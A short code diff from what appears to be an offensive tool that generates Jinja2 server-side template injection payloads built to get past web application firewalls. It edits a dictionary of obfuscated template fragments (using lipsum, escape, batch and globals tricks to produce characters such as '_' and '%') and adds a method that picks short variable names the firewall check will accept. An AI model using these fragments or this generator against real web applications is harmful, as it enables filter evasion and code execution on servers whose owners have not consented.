@@ -6,6 +6,7 @@ from typing import Iterable, Dict, Any, Callable, Union
 import logging
 import random
 import string
+import re
 
 logger = logging.getLogger("context_vars")
 
@@ -63,7 +64,7 @@ context_payloads_all: ContextPayloads = {
         "ndr": "_",
         "sls": "/",
     },
-    "{%set unn=lipsum|escape|batch(22)|list|first|last%}": {"unn": "_"},
+    "{%set unn=lipsum|escape|batch(22)|first|last%}": {"unn": "_"},
     "{%set perc=lipsum()|urlencode|first%}": {"perc": "%"},
     "{%set percc=(lipsum[((({}|select()|trim|list)[24]))*2+"
     + "dict(globals=x)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
@@ -150,6 +151,27 @@ class ContextVariableUtil:
         """
         all_vars = set(v for d in self.context_payloads.values() for v in d)
         return var_name in all_vars
+
+    def generate_related_variable_name(self, value: str) -> Union[str, None]:
+        """生成一个和value相关的变量名，如globals => gl或go，用于提升最终payload的可读性
+
+        Args:
+            value (str): 和变量名相关的字符串
+
+        Returns:
+            Union[str, None]: 结果
+        """
+        value = "".join(re.findall("[a-zA-Z]+", value)).lower()
+        if len(value) < 2:
+            return None
+        for c in value[1:]:
+            var_name = value[0] + c
+            if self.is_variable_exists(var_name):
+                continue
+            if not self.waf(var_name):
+                continue
+            return var_name
+        return None
 
     def generate_random_variable_name(self) -> Union[str, None]:
         """生成一个可能的变量名
